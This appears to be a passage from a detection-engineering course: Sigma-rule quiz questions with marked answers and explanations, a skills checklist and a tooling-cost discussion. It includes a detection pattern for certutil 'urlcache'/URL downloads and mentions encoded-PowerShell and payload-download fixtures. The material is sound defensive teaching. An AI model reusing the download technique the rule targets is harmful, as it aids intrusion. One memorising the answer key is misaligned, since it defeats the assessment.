**Why:** The three capabilities build on each other and each one alone is insufficient — "a repository without a pipeline is just a tidier console", and a pipeline without a lifecycle gives you a well-maintained library nobody has decided to keep. The tidier-console answer is the repository-without-pipeline case, which is a different gap from the one this question describes.

### Q3. DET-031 fires 200 times a month and takes four minutes to triage per alert. Using the phase's arithmetic, what is the annual analyst cost? <!-- id: advance-07-q03 energy: normal -->

- [ ] About $600
- [ ] About $7,200 in analyst time, which is spend that earns nothing back
- [ ] About $1,800
- [x] About $7,200 a year, roughly the cost of a mid-range security tool licence

**Why:** 200 alerts times four minutes is roughly 13.3 analyst hours a month, and at $45 an hour that is about $600 a month — about $7,200 a year, with zero true positives in the last twelve months. $600 is the monthly figure with the annual label attached; the third option is the same error in the other direction. Option 2 has roughly the right number but describes it as money spent on triage, when the phase's point is that the money bought nothing at all.

### Q4. Why does the phase organise `rules/` by telemetry source rather than by threat actor, severity, or ATT&CK tactic? <!-- id: advance-07-q04 energy: low -->

- [ ] Threat-actor names are sensitive and should not appear in a repository
- [ ] Severity-based folders make CI conversion faster
- [ ] Actor names are shorter and make better directory names
- [x] Log sources are stable, while actor names, severities, and tactic mappings all change
- [ ] ATT&CK requires one folder per tactic to compute coverage

**Why:** The phase lists the failing alternatives directly: actors get renamed, merged, and rebranded; severity changes after tuning, which would move the file and break every link; and a rule often maps to two tactics while a file can only live in one place. The coverage claim is backwards — coverage is computed from the `tags` field inside each rule, not from where the file sits.

### Q5. A rule carries `status: experimental`. What is that field actually doing? <!-- id: advance-07-q05 energy: low -->

- [x] Making the honest statement that it has not been validated against your traffic
- [ ] Marking the rule as broken and blocking it from deploying
- [ ] Recording that the rule was written by a junior engineer
- [ ] Setting the alert routing to the analyst queue rather than on-call

**Why:** `experimental` is one of the five Sigma status values — `stable`, `test`, `experimental`, `deprecated`, `unsupported` — and it says nobody has agreed to live with this rule yet. Routing is decided by `level` plus your team's local convention about what each level means, which the phase says is a written-down local decision rather than something the specification settles.

### Q6. Which pair of files does the worked repository layout place in `tests/samples/` beside the positive fixture `proc_encoded_powershell.true.json` — that is, which two fixture kinds does it supply in addition to the positive one? <!-- id: advance-07-q06 energy: low -->

- [ ] `proc_encoded_powershell.yml` and `proc_encoded_powershell.md`
- [x] `proc_encoded_powershell.false.json` and `proc_encoded_powershell.near_miss.json`
- [ ] `proc_encoded_powershell.positive.json` and `proc_encoded_powershell.negative.json`
- [ ] `proc_encoded_powershell.expected.json` and `proc_encoded_powershell.actual.json`

**Why:** Fixtures are named after the rule with a `.<kind>.json` suffix, and the harness walks exactly three kinds: `true`, `false`, and `near_miss`. The `positive`/`negative` labels describe what those fixtures are for, but the phase never uses them as filenames, and a fixture set built from the last two options would leave the harness's `fixtures_for()` looking for files that do not exist.

### Q7. Take the certutil rule from Part 3, which requires the image to end with `\certutil.exe` **and** the command line to contain one of `urlcache`, `http://`, or `https://`. Which fixture in the phase actually matches it? <!-- id: advance-07-q07 energy: high -->

- [ ] Only the first — the payload download
- [ ] The first and the third
- [x] The first and the second — the CRL retrieval matches too, and that is correct behaviour
- [ ] All three, because the rule only requires certutil

**Why:** The second fixture runs `certutil.exe -p CRL -urlcache http://crl.example-ca.internal/root.crl`, which contains both `urlcache` and `http://`, so the rule fires exactly as designed — the phase stresses that this apparent negative is really a false positive a human closes, and it is how a rule acquires a blind spot if you treat it as proof of narrowness. Only the third fixture is a genuine near-miss: `certutil.exe -hashfile … SHA256` has no URL and no `urlcache`, so it must not match. The last option misreads the condition, which is an `and`, not certutil alone.

### Q8. What is the near-miss fixture actually for? <!-- id: advance-07-q08 energy: normal -->

- [ ] Proving the rule fires on the technique in your environment
- [ ] Replacing the negative fixture so you only need one file per rule
- [ ] Measuring the rule's false-positive rate before deployment
- [x] Catching the tuning edit six months from now that quietly broadens the rule

**Why:** The phase calls the near-miss the fixture people leave out, and names its job: an event a careless future edit would wrongly catch. It is not a substitute for the negative — the phase says a genuine negative for this rule would be a purely local certutil operation with no network indicator at all. Nor can a fixture measure false-positive rate or prove real-world detection; both sit explicitly in the "does not prove" column.

### Q9. You convert a rule with the right backend but without the right processing pipeline, and it deploys cleanly. What has actually happened? <!-- id: advance-07-q09 energy: normal -->

- [ ] The conversion failed and CI would have caught it
- [ ] The rule detects correctly but with more noise than expected
- [x] The query looks correct, matches the wrong fields, and detects nothing — which the phase calls the most expensive conversion mistake
- [ ] The backend silently broadened every wildcard in the rule

**Why:** The backend knows the query language; the pipeline is what substitutes your log schema's field names, so a rule that says `Image` can end up querying a field your index does not populate. The result is syntactically valid and deploys without complaint, which is exactly why it is expensive — nothing fails, so nothing alerts anyone to the problem. The wildcard answer describes coarser matching, a different drift cause.

### Q10. A five-minute Sigma correlation rule is converted to an Elasticsearch ES|QL correlation rule. Events that straddle a five-minute clock boundary do not trigger it. Which drift cause is this? <!-- id: advance-07-q10 energy: high -->

- [ ] An unsupported feature the backend should have warned about
- [ ] A missing pipeline substituting the wrong field names
- [ ] Coarser wildcard or case matching between the two languages
- [x] Time-boundary behaviour — the window is clock-aligned rather than sliding, and the phase says to document it because it produces false negatives

**Why:** ES|QL correlation rules use time bucketing, so a `timespan` of `5m` only matches when all the events fall inside the same clock-aligned five-minute bucket; split across a boundary, neither bucket meets the threshold. The phase's striking conclusion is that the rule is correct, the backend is correct, and the detection still misses. That makes it documentation-worthy rather than a bug — which is exactly how it differs from the other three drift causes, each of which is caught by reading the conversion output or comparing field names.

### Q11. You measure a rule at 3% precision. Under which condition does the phase steer you toward tuning rather than retiring? <!-- id: advance-07-q11 energy: high -->

- [ ] When the rule's owner has left the team
- [ ] When the rule maps to a technique that is in your coverage scope
- [x] When the benign matches are one dominant cause rather than a long tail of different causes
- [ ] When fewer than 50 alerts were produced in the measurement period

**Why:** Grouping the benign causes before deciding is the step people skip. Twenty-two of twenty-nine matches from a single cause is a fixable tuning problem; five alerts from five different causes is a rule that will never be precise enough to page on, and demotion or retirement may be the right answer. Owner history and coverage scope do not enter the decision — the retirement record in the phase retires a rule for long-tail benign causes plus a better replacement, and says nothing about who owned it.

### Q12. Which single sentence in a retirement record turns a deletion into a professional decision? <!-- id: advance-07-q12 energy: normal -->

- [ ] The measured precision figure for the last two periods
- [x] The accepted loss — what stops being detected once the rule is gone
- [ ] The name of the rule that supersedes it
- [ ] The date the detection lead approved the retirement

**Why:** The phase says every retirement loses something, and naming, quantifying, and recording that loss in the coverage summary is the difference between managing a library and pruning it by feel. The other three are genuinely required evidence — the retirement table demands measured periods, a replacement's rule ID, and a dated decision — but they justify the deletion without admitting its cost, and it is the admission that makes the record defensible.

## Checklist

- [ ] I can explain why a console-managed detection fails, naming the five specific things that break. <!-- id: advance-07-console-failure-modes energy: low -->
- [ ] I can price one badly maintained rule in analyst hours and currency. <!-- id: advance-07-detection-debt-cost energy: low -->
- [ ] I built a detection repository organised by telemetry source, not by actor or severity. <!-- id: advance-07-repo-layout energy: normal -->
- [ ] I migrated real rules with complete metadata, including `falsepositives` and `modified`. <!-- id: advance-07-rule-metadata energy: normal -->
- [ ] My commit messages name the reason a rule exists, with an incident or technique reference. <!-- id: advance-07-commit-reasons energy: low -->
- [ ] I can review a detection PR against twelve checks and give one of four decisions. <!-- id: advance-07-review-standard energy: normal -->
- [ ] I wrote positive, negative, and near-miss fixtures, and can explain what the near-miss catches. <!-- id: advance-07-fixture-design energy: normal -->
- [ ] I built a pytest harness and watched it fail on a deliberately broken rule. <!-- id: advance-07-test-harness energy: normal -->
- [ ] I can state what a fixture test does and does not prove. <!-- id: advance-07-test-limits energy: low -->
- [ ] I run `sigma check` with `--fail-on-issues` so convention violations block a merge. <!-- id: advance-07-sigma-check-ci energy: normal -->
- [ ] I can explain why `sigmac` is retired and what replaces it. <!-- id: advance-07-sigmac-retired energy: low -->
- [ ] I built a CI pipeline that validates, tests, converts, and uploads artifacts, and saw it block a bad rule. <!-- id: advance-07-pipeline-built energy: high -->
- [ ] I can distinguish a backend from a processing pipeline and say what each decides. <!-- id: advance-07-backend-vs-pipeline energy: low -->
- [ ] I converted rules for two targets and read the output field by field for drift. <!-- id: advance-07-conversion-drift energy: high -->
- [ ] I can name a case where the deployed query legitimately differs from the source rule. <!-- id: advance-07-drift-cases energy: normal -->
- [ ] I mapped coverage at three levels and published the smallest number with its denominator. <!-- id: advance-07-coverage-three-levels energy: high -->
- [ ] I can explain why a tactic tag alone is not a coverage mapping. <!-- id: advance-07-attack-tag-quality energy: low -->
- [ ] I measured precision over at least 30 days and grouped the benign causes. <!-- id: advance-07-precision-measurement energy: high -->
- [ ] I tuned a rule as a committed change with evidence and a re-measurement date. <!-- id: advance-07-documented-tuning energy: normal -->
- [ ] I retired a rule, or wrote the case for retiring one, including the accepted loss. <!-- id: advance-07-retirement-record energy: normal -->
- [ ] I published a lifecycle table with an artefact and an owner at every stage. <!-- id: advance-07-lifecycle-table energy: normal -->
- [ ] I found the anti-patterns in my own queue and named a repair for each. <!-- id: advance-07-antipattern-audit energy: normal -->

## You're ready to move on when...

You can take one detection rule through a full as-code lifecycle — proposed on a branch, tested against fixtures, validated in CI, converted to a backend query, reviewed, deployed, tuned with a written reason, and eventually retired — with every one of those steps leaving evidence in a repository.

## Free vs Paid

### What's free and enough

Git, GitHub Actions on a public repository, Python, `sigma-cli`, pySigma and its backend plugins, pytest, `pre-commit`, and `yamllint` together are the whole toolchain, and every one of them is free and open source. The Sigma specification, the correlation and filter specifications, and the SigmaHQ rule conventions are published documents that describe exactly what a well-formed rule is. The SigmaHQ repository gives you thousands of peer-reviewed rules to read, and the Elastic and Splunk rule repositories give you two more large, professionally maintained sets to compare against. MITRE ATT&CK and the ATT&CK Navigator are free and cover the mapping work. Chainsaw and Hayabusa can run your Sigma rules against exported event logs, which means you can validate a rule end to end with no SIEM licence at all. Nothing in this phase needs money.

### What's paid and why you'd upgrade

Commercial detection-as-code platforms such as Panther, Anvilogic, and the detection-management tiers of large SIEM products add rule lifecycle management, multi-tenant deployment, alert-volume analytics, and testing frameworks integrated into the platform rather than bolted on beside it. Continuous-integration minutes on private repositories are a paid GitHub feature once you exceed the free allowance.

Managed pipeline services will run the conversion and deployment for you across many tenants. Enterprise Sigma support and curated rule subscriptions exist, and they sell currency and coverage rather than capability. None of these change the reasoning this phase teaches. They change how many rules and how many environments the reasoning is applied to.

### When it's worth paying

Pay when the estate is large enough that manual deployment is genuinely the bottleneck — typically when you have multiple SIEM tenants or environments and a rule must be promoted through them consistently. Pay when an employer already licenses a detection platform and the marginal cost of using it is zero, because the concepts transfer completely and the interface takes a fortnight.

Do not pay for anything while you are building the skill. The artefact that gets you the interview is a repository with three real rules, nine fixtures, a working pipeline, a drift review, and one honest precision measurement. A free stack produces that artefact in exactly the same quality as a paid one, because the quality lives in the tests and the evidence, not in the licence.
